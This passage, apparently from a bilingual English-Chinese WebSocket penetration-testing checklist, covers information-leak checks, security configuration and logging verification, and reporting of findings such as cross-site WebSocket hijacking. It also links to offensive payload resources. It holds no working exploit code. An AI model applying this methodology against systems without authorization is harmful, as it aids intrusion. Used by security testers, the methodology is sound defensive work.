  - Check if server error responses leak stack traces, internal IPs, framework versions, database query details, or file paths.

    检查服务器错误响应是否泄露堆栈跟踪、内部 IP 地址、框架版本、数据库查询详细信息或文件路径。
  - Check if messages from other users' sessions are accidentally broadcast to your connection (mass assignment of subscription channels, room ID collision).

    检查其他用户会话中的消息是否意外地广播到您的连接（订阅频道批量分配、房间 ID 冲突）。
  - Check if messages contain more fields than necessary — internal user IDs, email addresses, IP addresses, or server metadata that wasn't intended for the client.

    检查消息是否包含不必要的字段——内部用户 ID、电子邮件地址、IP 地址或服务器元数据，这些字段并非客户端需要的。

## Phase 7: Security Configuration & Logging

第七阶段：安全配置和日志记录

WebSocket-specific security configurations are often left at defaults. Verifying these controls is fast and frequently produces findings that are easy to remediate but easy to miss in a standard web application test.

WebSocket 特有的安全配置通常保留默认设置。验证这些控制措施速度很快，而且经常能发现一些易于修复但在标准 Web 应用程序测试中容易被忽略的问题。

- **Security Configuration Checks:

  安全配置检查：**

  - Verify that session cookies used for WebSocket authentication have the `Secure`, `HttpOnly`, and `SameSite=Lax` (or `Strict`) flags set. `SameSite=Lax/Strict` is a strong secondary CSWSH mitigation.

    验证用于 WebSocket 身份验证的会话 cookie 是否已设置 `Secure` 、 `HttpOnly` 和 `SameSite=Lax` （或 `Strict` ）标志。SameSite `SameSite=Lax/Strict` 是一种有效的辅助性 CSWSH 缓解措施。
  - Check that the `Content-Security-Policy` header on the WebSocket-using page does not use `connect-src: *` — this would allow the page's JavaScript to open WebSocket connections to any domain.

    检查使用 WebSocket 的页面上的 `Content-Security-Policy` 标头是否未使用 `connect-src: *` — 这将允许页面的 JavaScript 打开到任何域的 WebSocket 连接。
  - Verify the server enforces a per-user (not just per-IP) connection limit to prevent connection exhaustion by authenticated users.

    验证服务器是否强制执行按用户（而不仅仅是按 IP）的连接数限制，以防止已认证用户耗尽连接数。
  - If the app uses Socket.IO, confirm it's running a patched version — past versions had DoS and authentication bypass vulnerabilities. Check the version number in responses or `package.json`.

    如果应用使用了 Socket.IO，请确认它运行的是已打补丁的版本——旧版本存在拒绝服务攻击和身份验证绕过漏洞。检查响应或 `package.json` 文件中的版本号。
  - Verify the WebSocket server validates the `Sec-WebSocket-Protocol` subprotocol — accepting arbitrary subprotocols can enable protocol confusion attacks.

    验证 WebSocket 服务器是否验证 `Sec-WebSocket-Protocol` 子协议——接受任意子协议可能会导致协议混淆攻击。
- Logging & Monitoring Verification:

  日志记录与监控验证：**

  Traditional HTTP access logs capture only the initial upgrade request, missing all message-level events. This is a blind spot unique to WebSocket applications — confirming it exists is a valid finding.

  传统的 HTTP 访问日志仅捕获初始升级请求，遗漏了所有消息级别的事件。这是 WebSocket 应用程序特有的盲点——确认其存在本身就是一个有效的发现。

  - Verify that authentication failures during the WebSocket handshake are logged (not silently dropped).

    验证 WebSocket 握手期间的身份验证失败是否被记录（而不是被静默丢弃）。
  - Verify that authorization failures on individual messages are logged with the user identity, IP, and the attempted action.

    确认每条消息的授权失败都已记录，包括用户身份、IP 地址和尝试执行的操作。
  - Verify that rate limit violations and oversized message rejections are logged and alertable.

    确认速率限制违规和超大消息拒绝事件已被记录并发出警报。
  - Confirm that message-level logs do NOT contain sensitive data: full message bodies, session tokens, passwords, or PII.

    确认消息级日志不包含敏感数据：完整的消息正文、会话令牌、密码或个人身份信息。

## Phase 8: Reporting 📝

第八阶段：报告📝

WebSocket findings often need extra context in reports — reviewers may not immediately understand why CSWSH is critical or how a missing rate limit on a persistent connection differs from the same issue on an HTTP endpoint. Always include the full handshake request in your evidence.

WebSocket 问题报告通常需要提供更多上下文信息——审核人员可能无法立即理解 CSWSH 的重要性，或者持久连接中缺少速率限制与 HTTP 端点上的相同问题有何不同。务必在证据中包含完整的握手请求。

- **Document Findings:  文件调查结果：**

  - Detail each vulnerability: Description, full handshake PoC, message payload PoC, server response, and Impact.

    详细描述每个漏洞：描述、完整的握手 PoC、消息有效载荷 PoC、服务器响应和影响。
  - Include evidence: Burp WebSocket history export, screenshots, Burp Collaborator interaction logs (for OOB findings), PoC HTML page (for CSWSH).

    请提供证据：Burp WebSocket 历史记录导出、屏幕截图、Burp Collaborator 交互日志（用于 OOB 发现）、PoC HTML 页面（用于 CSWSH）。
  - Assign severity using CVSS v3.1 or CVSS v4.0 in the context of a persistent, bidirectional channel (CSWSH is typically High/Critical; missing rate limiting is typically Medium).

    在持续双向信道的背景下，使用 CVSS v3.1 或 CVSS v4.0 分配严重性（CSWSH 通常为高/严重；缺少速率限制通常为中等）。
  - Map to relevant CWEs: CWE-1385 (Missing Origin Validation in WebSockets), CWE-20 (Improper Input Validation), CWE-400 (Resource Exhaustion).

    映射到相关的 CWE：CWE-1385（WebSocket 中缺少来源验证）、CWE-20（输入验证不当）、CWE-400（资源耗尽）。
- **Provide Remediation Recommendations** specific to the framework in use (Node.js `ws`, Django Channels, Spring WebSocket, Gorilla WebSocket).

  提供针对所用框架（Node.js `ws` 、Django Channels、Spring WebSocket、Gorilla WebSocket）的具体**修复建议** 。
- **Structure Report:** Executive Summary, Methodology, Findings (sorted by severity), Conclusion, Appendices.

  **结构报告：** 执行摘要、方法、调查结果（按严重程度排序）、结论、附录。

## 📚 Resources  📚 资源

- [OWASP WebSocket Security Cheat Sheet

  OWASP WebSocket 安全速查表](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — WebSocket Attacks

  PortSwigger 网络安全学院 — WebSocket 攻击](https://portswigger.net/web-security/websockets)
- [PortSwigger — Cross-Site WebSocket Hijacking (CSWSH)

  PortSwigger — 跨站 WebSocket 劫持 (CSWSH)](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [PayloadsAllTheThings — WebSockets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md)
- [HackTricks — WebSocket Attacks

  HackTricks — WebSocket 攻击](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)
- [socketsleuth — Burp Suite Extension for WebSocket Testing

  socketsleuth — 用于 WebSocket 测试的 Burp Suite 扩展](https://github.com/snyk/socketsleuth)
- [wsrepl — Interactive WebSocket REPL for Pentesting (Doyensec)

  wsrepl — 用于渗透测试的交互式 WebSocket REPL (Doyensec)](https://github.com/doyensec/wsrepl)
- [wscat — CLI WebSocket Client

  wscat — CLI WebSocket 客户端](https://github.com/websockets/wscat)
- [WebSocket King — Browser-based WebSocket Client

  WebSocket King — 基于浏览器的 WebSocket 客户端](https://websocketking.com/)
- [CWE-1385 — Missing Origin Validation in WebSockets

  CWE-1385 — WebSocket 中缺少来源验证](https://cwe.mitre.org/data/definitions/1385.html)
- [Gitpod CSWSH CVE (2023) — Real-world account takeover via WebSocket hijacking

  Gitpod CSWSH CVE (2023) — 通过 WebSocket 劫持实现现实世界账户接管](https://github.com/advisories/GHSA-f53g-frr2-jhpf)

## Conclusion  结论

WebSocket security testing is increasingly important as real-time features become standard across web applications. The persistent, bidirectional nature of WebSocket connections means that a single missed check — especially missing origin validation — can hand an attacker a live, authenticated session rather than a one-off forged request. Use this checklist on every engagement where you find WebSocket endpoints, adapt the payloads to the specific message format in use, and always verify both the handshake layer and the message layer independently.

随着实时功能在 Web 应用中日益普及，WebSocket 安全测试的重要性也与日俱增。WebSocket 连接的持久性和双向性意味着，哪怕漏掉一项检查（尤其是缺少来源验证），攻击者都可能获得一个实时且已认证的会话，而不仅仅是一次伪造的请求。因此，在每次遇到 WebSocket 端点时，都应该使用此检查清单，并根据所使用的特定消息格式调整有效负载，同时始终独立验证握手层和消息层。
